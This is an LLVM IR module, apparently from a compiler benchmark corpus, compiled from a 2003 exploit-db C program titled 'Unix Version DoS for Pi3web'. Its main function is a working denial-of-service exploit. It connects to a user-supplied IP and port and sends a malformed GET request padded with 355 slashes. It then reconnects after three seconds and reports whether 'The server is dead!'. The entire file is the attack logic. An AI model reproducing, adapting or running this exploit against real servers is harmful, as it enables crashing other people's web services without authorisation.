; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22587.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22587.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"USAGE: %s IP PORT\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"e.g. ./pi3web-DoS 127.0.0.1 80\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"%s %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"Socket\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"Connect\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"\0A\09\09(c) 2003 DTORS Security\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"\09\09Unix Version DoS for Pi3web\0A\00", align 1
@.str.8 = private unnamed_addr constant [23 x i8] c"\09\09by Angelo Rosiello\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"Malformed packet sent!\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c"Checking if the server crashed...\0A\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"The server is dead!\0A\00", align 1
@.str.12 = private unnamed_addr constant [31 x i8] c"The server is not vulnerable!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [355 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca [360 x i8], align 16
  %13 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8** %11, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 3
  br i1 %15, label %19, label %16

16:                                               ; preds = %2
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %26

19:                                               ; preds = %16, %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 @exit(i32 0) #3
  unreachable

26:                                               ; preds = %16
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, 2
  br i1 %28, label %29, label %30

29:                                               ; preds = %26
  store i32 80, i32* %7, align 4
  br label %35

30:                                               ; preds = %26
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  store i32 %34, i32* %7, align 4
  br label %35

35:                                               ; preds = %30, %29
  store i32 0, i32* %6, align 4
  br label %36

36:                                               ; preds = %43, %35
  %37 = load i32, i32* %6, align 4
  %38 = icmp slt i32 %37, 355
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i32, i32* %6, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [355 x i8], [355 x i8]* %10, i64 0, i64 %41
  store i8 47, i8* %42, align 1
  br label %43

43:                                               ; preds = %39
  %44 = load i32, i32* %6, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %6, align 4
  br label %36

46:                                               ; preds = %36
  %47 = getelementptr inbounds [360 x i8], [360 x i8]* %12, i64 0, i64 0
  %48 = load i8*, i8** %11, align 8
  %49 = getelementptr inbounds [355 x i8], [355 x i8]* %10, i64 0, i64 0
  %50 = call i32 @sprintf(i8* %47, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* %48, i8* %49)
  %51 = load i32, i32* %7, align 4
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i64 @inet_addr(i8* %54)
  %56 = call i32 @addr_initialize(%struct.sockaddr_in* %13, i32 %51, i64 %55)
  %57 = load i32, i32* @AF_INET, align 4
  %58 = load i32, i32* @SOCK_STREAM, align 4
  %59 = call i32 @socket(i32 %57, i32 %58, i32 0)
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* %8, align 4
  %61 = icmp slt i32 %60, 0
  br i1 %61, label %62, label %64

62:                                               ; preds = %46
  %63 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %64

64:                                               ; preds = %62, %46
  %65 = load i32, i32* %8, align 4
  %66 = icmp sge i32 %65, 0
  %67 = zext i1 %66 to i32
  %68 = call i32 @assert(i32 %67)
  %69 = load i32, i32* %8, align 4
  %70 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %71 = call i32 @connect(i32 %69, %struct.sockaddr* %70, i32 4)
  store i32 %71, i32* %9, align 4
  %72 = load i32, i32* %9, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %76

74:                                               ; preds = %64
  %75 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  br label %76

76:                                               ; preds = %74, %64
  %77 = load i32, i32* %9, align 4
  %78 = icmp eq i32 %77, 0
  %79 = zext i1 %78 to i32
  %80 = call i32 @assert(i32 %79)
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0))
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0))
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0))
  %84 = load i32, i32* %8, align 4
  %85 = getelementptr inbounds [360 x i8], [360 x i8]* %12, i64 0, i64 0
  %86 = getelementptr inbounds [360 x i8], [360 x i8]* %12, i64 0, i64 0
  %87 = call i32 @strlen(i8* %86)
  %88 = call i32 @write(i32 %84, i8* %85, i32 %87)
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0))
  %90 = load i32, i32* %8, align 4
  %91 = call i32 @close(i32 %90)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  %93 = call i32 @sleep(i32 3)
  %94 = load i32, i32* @AF_INET, align 4
  %95 = load i32, i32* @SOCK_STREAM, align 4
  %96 = call i32 @socket(i32 %94, i32 %95, i32 0)
  store i32 %96, i32* %8, align 4
  %97 = load i32, i32* %8, align 4
  %98 = icmp slt i32 %97, 0
  br i1 %98, label %99, label %101

99:                                               ; preds = %76
  %100 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %101

101:                                              ; preds = %99, %76
  %102 = load i32, i32* %8, align 4
  %103 = icmp sge i32 %102, 0
  %104 = zext i1 %103 to i32
  %105 = call i32 @assert(i32 %104)
  %106 = load i32, i32* %8, align 4
  %107 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %108 = call i32 @connect(i32 %106, %struct.sockaddr* %107, i32 4)
  store i32 %108, i32* %9, align 4
  %109 = load i32, i32* %9, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %111, label %114

111:                                              ; preds = %101
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  %113 = call i32 @exit(i32 0) #3
  unreachable

114:                                              ; preds = %101
  %115 = load i32, i32* %9, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %119

117:                                              ; preds = %114
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.12, i64 0, i64 0))
  br label %119

119:                                              ; preds = %117, %114
  br label %120

120:                                              ; preds = %119
  %121 = load i32, i32* %8, align 4
  %122 = call i32 @close(i32 %121)
  %123 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @addr_initialize(%struct.sockaddr_in*, i32, i64) #1

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
